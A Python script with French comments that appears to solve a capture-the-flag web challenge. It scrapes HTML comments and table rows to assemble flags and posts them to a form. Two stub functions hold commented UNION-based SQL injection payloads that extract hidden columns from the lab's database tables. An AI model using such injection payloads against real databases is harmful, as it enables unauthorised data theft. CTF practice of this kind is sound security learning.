import requests
from bs4 import BeautifulSoup, Comment
import re

def flag1(url):
    response = requests.get(url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        commentaires = soup.find_all(string=lambda text: isinstance(text, Comment))
        
        pattern = r':[^\s]*[A-Za-z0-9]'
        
        valeurs_concatenees = ""
        for commentaire in commentaires:
            resultats = re.findall(pattern, commentaire)
            for resultat in resultats:
                valeur = resultat[1:]
                valeurs_concatenees += valeur
                
        print(valeurs_concatenees)

        form_data = {'ctf':valeurs_concatenees}

        form = soup.find('form')
        if form:
            form_action = form.get('action', '')
            form_method = form.get('method', 'post')

            form_action_url = f"{url.rstrip('/')}/{form_action.lstrip('/')}"

            if form_method.lower() == 'post':
                post_response = requests.post(form_action_url, data=form_data)

                if post_response.status_code == 200:
                    print("Flag successfully posted for checking.")
                    return post_response
                else:
                    print(f"Failed to post flag. Status code: {post_response.status_code}")
            else:
                print("Form method is not POST.")
    else:
        print(f"Échec de la requête. Statut de la requête : {response.status_code}")


def flag2(url):

    post_response = flag1(url)
    # Vérifie si la requête POST a réussi (statut 200)
    if post_response.status_code == 200:
        # Analyse le contenu HTML de la page
        soup = BeautifulSoup(post_response.text, 'html.parser')

        # Trouve toutes les lignes (<tr>) dans le code source
        lignes = soup.find_all('tr', height="30")

        # Initialise une liste pour stocker les paires (ID, lettre/chiffre)
        lettres_chiffres_liste = []

        for ligne in lignes:
            # Trouve la balise <td> avec l'ID et le titre
            id_td = ligne.find('td', id='row_id')
            title_td = ligne.find('td', id='row_title')

            # Vérifie si les balises <td> existent
            if id_td and title_td:
                # Extrait le titre avec une lettre ou un chiffre entre deux dièses (#)
                titre_match = re.search(r'#([A-Za-z0-9])#', title_td.text)

                # Vérifie si une correspondance est trouvée
                if titre_match:
                    # Récupère la lettre ou le chiffre
                    lettre_chiffre = titre_match.group(1)

                    # Ajoute l'ID et la lettre ou le chiffre à la liste
                    id_value = int(id_td.text.strip())  # Convertit l'ID en entier
                    lettres_chiffres_liste.append((id_value, lettre_chiffre))

        # Trie la liste par ordre croissant d'ID
        lettres_chiffres_liste.sort(key=lambda x: x[0])

        # Concatène les lettres et chiffres triés
        lettres_chiffres_concatenes = ''.join(item[1] for item in lettres_chiffres_liste)

        # Affiche la chaîne concaténée de lettres et chiffres triés
        print(lettres_chiffres_concatenes)
        response = requests.get(url)

        form_data = {'ctf':lettres_chiffres_concatenes}

        form = soup.find('form')
        if form:
            form_action = form.get('action', '')
            form_method = form.get('method', 'post')

            form_action_url = f"{url.rstrip('/')}/{form_action.lstrip('/')}"

            if form_method.lower() == 'post':
                post_response2 = requests.post(form_action_url, data=form_data)

                if post_response2.status_code == 200:
                    print("Flag successfully posted for checking.")
                else:
                    print(f"Failed to post flag. Status code: {post_response2.status_code}")
            else:
                print("Form method is not POST.")
    else:
        print(f"Échec de la requête. Statut de la requête : {post_response.status_code}")

    
def flag3(url):
    #1'UNION SELECT  ctf_65deab50,2,3,4,5,6,7,8 FROM movies WHERE ctf_65deab50 is not NULL #
    None



def flag4(url):
    #1'UNION SELECT  ctf_65deab50,2,3,4,5,6,7,8 FROM movies_archive_4dfe560c WHERE ctf_65deab50 is not NULL #
    None

url_a_analyser = 'http://92.205.177.169:83' 
flag1(url_a_analyser)
flag2(url_a_analyser)